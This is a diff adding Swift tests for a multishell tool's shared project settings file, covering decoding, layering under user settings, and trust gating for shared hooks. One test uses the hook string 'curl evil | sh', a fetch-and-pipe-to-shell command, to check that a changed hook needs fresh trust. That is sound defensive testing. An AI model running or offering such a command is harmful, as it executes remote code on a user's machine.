@@ -1,0 +1,115 @@
+import Foundation
+import Testing
+
+@testable import MultishellCore
+
+/// The repository's `.multishell.json`, and how it layers under the user's
+/// own settings.
+@Suite
+struct SharedProjectSettingsTests {
+  private func decode(_ json: String) throws -> SharedProjectSettings {
+    try JSONDecoder().decode(SharedProjectSettings.self, from: Data(json.utf8))
+  }
+
+  @Test func everyFieldIsOptionalAndAWrongTypeCostsThatFieldOnly() throws {
+    let shared = try decode(
+      #"{ "branchPrefix": "team/", "iconTint": "blue", "postCreateHook": ["npm"], "iconGlyph": "🚀" }"#
+    )
+    #expect(shared.branchPrefix == "team/")
+    #expect(shared.iconTint == nil && shared.postCreateHook == nil)
+    #expect(shared.iconGlyph == "🚀")
+    #expect(try decode("{}") == SharedProjectSettings())
+    #expect(throws: DecodingError.self) { try decode("[1, 2]") }
+  }
+
+  @Test func blankStringsReadAsAbsent() throws {
+    let shared = try decode(#"{ "worktreeDirectory": "  ", "preCreateHook": "" }"#)
+    #expect(shared.worktreeDirectory == nil && shared.preCreateHook == nil)
+    #expect(!shared.hasHooks)
+  }
+
+  @Test func theHooksTextNamesEachHookSoADecisionIsAboutExactlyThose() {
+    let one = SharedProjectSettings(postCreateHook: "npm ci")
+    #expect(one.hooksText == "post-create:\nnpm ci")
+    let two = SharedProjectSettings(postCreateHook: "npm ci", preDeleteHook: "exit 1")
+    #expect(two.hooksText == "post-create:\nnpm ci\n\npre-delete:\nexit 1")
+    #expect(one.hooksText != two.hooksText, "adding a hook is a new question")
+    #expect(SharedProjectSettings(branchPrefix: "x/").hooksText == nil)
+  }
+
+  @Test func loadReturnsNilForARepositoryWithoutTheFileAndThrowsForABrokenOne() throws {
+    let root = URL(fileURLWithPath: NSTemporaryDirectory())
+      .appendingPathComponent("ms-shared-\(UUID().uuidString)", isDirectory: true)
+    try FileManager.default.createDirectory(at: root, withIntermediateDirectories: true)
+    defer { try? FileManager.default.removeItem(at: root) }
+
+    #expect(try SharedProjectSettings.load(from: root) == nil)
+    try #"{ "branchPrefix": "team/" }"#.write(
+      to: SharedProjectSettings.file(in: root), atomically: true, encoding: .utf8)
+    #expect(try SharedProjectSettings.load(from: root)?.branchPrefix == "team/")
+    try "not json".write(
+      to: SharedProjectSettings.file(in: root), atomically: true, encoding: .utf8)
+    #expect(throws: (any Error).self) { try SharedProjectSettings.load(from: root) }
+  }
+
+  @Test func theUsersValuesWinAndTheFileFillsWhatTheyLeftBlank() {
+    let shared = SharedProjectSettings(
+      worktreeDirectory: "../trees", branchPrefix: "team/", postCreateHook: "npm ci",
+      iconGlyph: "hammer", iconTint: 4)
+    let blank = ProjectSettings().layered(over: shared)
+    #expect(blank.worktreeDirectory == "../trees" && blank.branchPrefix == "team/")
+    #expect(blank.iconGlyph == "hammer" && blank.iconTint == 4)
+    #expect(blank.postCreateHook == "", "hooks wait for trust")
+
+    let own = ProjectSettings(
+      branchPrefix: "me/", postCreateHook: "make", iconTint: 1,
+      sharedHooks: SharedHooksDecision(hooks: shared.hooksText!, trusted: true)
+    ).layered(over: shared)
+    #expect(own.worktreeDirectory == "../trees", "left blank, so the file's")
+    #expect(own.branchPrefix == "me/" && own.iconTint == 1)
+    #expect(own.postCreateHook == "make", "the user's hook stands over the file's")
+
+    #expect(
+      ProjectSettings(branchPrefix: "me/").layered(over: nil)
+        == ProjectSettings(branchPrefix: "me/"))
+  }
+
+  @Test func sharedHooksRunOnlyWhenTrustedAndOnlyWhileTheTextIsTheOneTrusted() {
+    let shared = SharedProjectSettings(postCreateHook: "npm ci", preDeleteHook: "exit 1")
+    let text = shared.hooksText!
+    let asked = ProjectSettings()
+    #expect(asked.needsHookDecision(for: shared) && !asked.trustsHooks(of: shared))
+
+    let trusted = ProjectSettings(sharedHooks: SharedHooksDecision(hooks: text, trusted: true))
+    #expect(trusted.trustsHooks(of: shared) && !trusted.needsHookDecision(for: shared))
+    let layered = trusted.layered(over: shared)
+    #expect(layered.postCreateHook == "npm ci" && layered.preDeleteHook == "exit 1")
+    #expect(layered.preCreateHook == "", "a hook the file does not have stays blank")
+
+    let declined = ProjectSettings(sharedHooks: SharedHooksDecision(hooks: text, trusted: false))
+    #expect(!declined.trustsHooks(of: shared) && !declined.needsHookDecision(for: shared))
+    #expect(declined.layered(over: shared).postCreateHook == "")
+
+    let changed = SharedProjectSettings(postCreateHook: "curl evil | sh", preDeleteHook: "exit 1")
+    #expect(!trusted.trustsHooks(of: changed), "a changed hook is not the one trusted")
+    #expect(trusted.needsHookDecision(for: changed), "and is asked about again")
+  }
+
+  @Test func aWhitespaceOnlyHookOfTheUsersTurnsTheFilesOff() {
+    let shared = SharedProjectSettings(postCreateHook: "npm ci")
+    let optedOut = ProjectSettings(
+      postCreateHook: " ", sharedHooks: SharedHooksDecision(hooks: shared.hooksText!, trusted: true)
+    ).layered(over: shared)
+    #expect(optedOut.postCreateHook == " ", "kept as the user's none, not replaced")
+  }
+}
+
+@Suite
+struct ProjectNameTests {
+  @Test func aBareRepositoryIsNamedWithoutItsSuffixOrByTheFolderThatHidesIt() {
+    #expect(Project(path: URL(fileURLWithPath: "/w/demo")).name == "demo")
+    #expect(Project(path: URL(fileURLWithPath: "/w/demo.git")).name == "demo")
+    #expect(Project(path: URL(fileURLWithPath: "/w/demo/.bare")).name == "demo")
+    #expect(Project(path: URL(fileURLWithPath: "/w/demo/.git")).name == "demo")
+  }
+}
